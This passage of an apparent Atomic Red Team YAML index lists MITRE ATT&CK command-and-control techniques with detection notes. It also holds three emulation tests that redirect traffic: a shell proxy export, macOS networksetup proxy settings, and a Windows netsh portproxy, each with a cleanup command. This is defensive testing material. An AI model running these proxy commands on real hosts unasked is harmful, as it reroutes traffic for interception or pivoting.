        command: 'export #{proxy_scheme}_proxy=#{proxy_server}

          '
        cleanup_command: |
          unset http_proxy
          unset https_proxy
        name: sh
    - name: Connection Proxy for macOS UI
      auto_generated_guid: 648d68c1-8bcd-4486-9abe-71c6655b6a2c
      description: |
        Enable traffic redirection on macOS UI (not terminal).
        The test will modify and enable the "Web Proxy" and "Secure Web Proxy" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.

        Note that this test may conflict with pre-existing system configuration.
      supported_platforms:
      - macos
      input_arguments:
        proxy_server:
          description: Proxy server URL (host)
          type: url
          default: 127.0.0.1
        proxy_port:
          description: Proxy server port
          type: integer
          default: 8080
        interface:
          description: Protocol to proxy (http or https)
          type: string
          default: Wi-Fi
      executor:
        name: sh
        command: |
          networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
          networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
        cleanup_command: "networksetup -setwebproxystate #{interface} off\nnetworksetup
          -setsecurewebproxystate #{interface} off  \n"
    - name: portproxy reg key
      auto_generated_guid: b8223ea9-4be2-44a6-b50a-9657a3d4e72a
      description: |
        Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
        Upon execution there will be a new proxy entry in netsh
        netsh interface portproxy show all
      supported_platforms:
      - windows
      input_arguments:
        connectaddress:
          description: Specifies the IPv4 address to which to connect. Acceptable
            values are IP address, computer NetBIOS name, or computer DNS name. If
            an address is not specified, the default is the local computer.
          type: string
          default: 127.0.0.1
        connectport:
          description: Specifies the IPv4 port, by port number or service name, to
            which to connect. If connectport is not specified, the default is the
            value of listenport on the local computer.
          type: string
          default: '1337'
        listenport:
          description: Specifies the IPv4 port, by port number or service name, on
            which to listen.
          type: string
          default: '1337'
      executor:
        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
          connectaddress=#{connectaddress}
        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
          -ErrorAction Ignore | Out-Null
        name: powershell
        elevation_required: true
  T1094:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ryan Becwar
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00
      type: attack-pattern
      created: '2017-05-31T21:31:10.314Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1094
        url: https://attack.mitre.org/techniques/T1094
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-20T19:03:04.295Z'
      name: Custom Command and Control Protocol
      description: Adversaries may communicate using a custom command and control
        protocol instead of encapsulating commands/data in an existing [Application
        Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations
        include mimicking well-known protocols or developing custom protocols (including
        raw sockets) on top of fundamental protocols provided by TCP/IP/another standard
        network stack.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

        Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1102.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7
      type: attack-pattern
      created: '2020-03-14T22:24:21.841Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1102.001
        url: https://attack.mitre.org/techniques/T1102/001
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-26T23:12:30.499Z'
      name: Dead Drop Resolver
      description: |-
        Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Host data that can relate unknown or suspicious process
        activity using a network connection is important to supplement any existing
        indicators of compromise based on malware command and control signatures and
        infrastructure or the presence of strong encryption. Packet capture analysis
        will require SSL/TLS inspection if data is encrypted. User behavior monitoring
        may help to detect abnormal patterns of activity.(Citation: University of
        Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1001.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade
      type: attack-pattern
      created: '2020-03-15T00:30:25.444Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1001.001
        url: https://attack.mitre.org/techniques/T1001/001
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-15T00:30:25.444Z'
      name: Junk Data
      description: 'Adversaries may add junk data to protocols used for command and
        control to make detection more difficult. By adding random or meaningless
        data to the protocols used for command and control, adversaries can prevent
        trivial methods for decoding, deciphering, or otherwise analyzing the traffic.
        Examples may include appending/prepending data with junk characters or writing
        junk characters between significant characters. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1043:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e
      created: '2017-05-31T21:30:42.657Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1043
        url: https://attack.mitre.org/techniques/T1043
      - source_name: University of Birmingham C2
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
      x_mitre_deprecated: true
      revoked: false
      description: "**This technique has been deprecated. Please use [Non-Standard
        Port](https://attack.mitre.org/techniques/T1571) where appropriate.**\n\nAdversaries
        may communicate over a commonly used port to bypass firewalls or network detection
        systems and to blend with normal network activity to avoid more detailed inspection.
        They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n*
        TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated
        with the port or a completely different protocol. \n\nFor connections that
        occur internally within an enclave (such as those between a proxy or pivot
        node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n*
        TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)"
      modified: '2022-07-22T18:51:42.238Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Commonly Used Port
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_is_subtechnique: false
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
